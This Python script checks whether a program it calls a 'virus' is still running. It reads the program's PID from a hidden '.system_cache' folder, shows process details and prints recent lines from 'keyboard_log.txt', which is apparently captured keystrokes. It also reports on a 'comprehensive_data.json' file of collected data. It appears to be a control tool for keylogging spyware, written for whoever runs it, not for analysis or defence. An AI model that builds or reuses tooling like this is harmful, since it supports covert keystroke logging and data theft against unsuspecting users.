#!/usr/bin/env python3
"""
Check if virus is still running
"""
import os
import sys
import time
from datetime import datetime

def check_virus_status():
    """Check if virus is running"""
    pid_file = ".system_cache/virus.pid"
    
    print("=" * 60)
    print("Virus Status Check")
    print("=" * 60)
    print()
    
    # Check PID file
    if not os.path.exists(pid_file):
        print("❌ Virus PID file not found")
        print("   Virus is NOT running")
        return False
    
    try:
        with open(pid_file, 'r') as f:
            pid = int(f.read().strip())
    except:
        print("❌ Could not read PID file")
        return False
    
    print(f"📄 PID file: {pid_file}")
    print(f"🔢 Process ID: {pid}")
    print()
    
    # Check if process is running
    try:
        os.kill(pid, 0)  # Signal 0 just checks if process exists
        print("✅ Virus is RUNNING")
        print()
        
        # Try to get process info
        try:
            import psutil
            process = psutil.Process(pid)
            print("Process Information:")
            print(f"  Command: {' '.join(process.cmdline())}")
            print(f"  CPU %: {process.cpu_percent(interval=0.1):.1f}%")
            print(f"  Memory %: {process.memory_percent():.2f}%")
            print(f"  Started: {datetime.fromtimestamp(process.create_time()).strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"  Runtime: {time.strftime('%H:%M:%S', time.gmtime(time.time() - process.create_time()))}")
        except ImportError:
            print("  (Install psutil for detailed process info)")
        except Exception as e:
            print(f"  (Could not get process details: {e})")
        
        print()
        
        # Check recent activity (merged into keyboard_log.txt)
        activity_log = ".system_cache/keyboard_log.txt"
        if os.path.exists(activity_log):
            print("Recent Activity (last 5 lines from keyboard_log.txt):")
            try:
                with open(activity_log, 'r') as f:
                    lines = f.readlines()
                    for line in lines[-5:]:
                        print(f"  {line.rstrip()}")
            except:
                print("  (Could not read log)")
        else:
            print("No log found yet")
        
        print()
        
        # Check data files
        data_files = [
            (".system_cache/comprehensive_data.json", "Comprehensive data"),
            (".system_cache/keyboard_log.txt", "Merged log (keyboard + activity)"),
        ]
        
        print("Data Files:")
        for file_path, description in data_files:
            if os.path.exists(file_path):
                size = os.path.getsize(file_path)
                mtime = datetime.fromtimestamp(os.path.getmtime(file_path))
                print(f"  ✅ {description}: {size:,} bytes (updated: {mtime.strftime('%H:%M:%S')})")
            else:
                print(f"  ⚠️  {description}: Not found")
        
        return True
        
    except OSError:
        print("❌ Virus is NOT running")
        print()
        print("The PID file exists but the process is dead.")
        print("This might mean:")
        print("  - Virus crashed")
        print("  - Virus was killed")
        print("  - Virus auto-closed after data collection")
        print()
        print("Removing stale PID file...")
        try:
            os.remove(pid_file)
            print("✅ Stale PID file removed")
        except:
            pass
        return False

if __name__ == "__main__":
    check_virus_status()

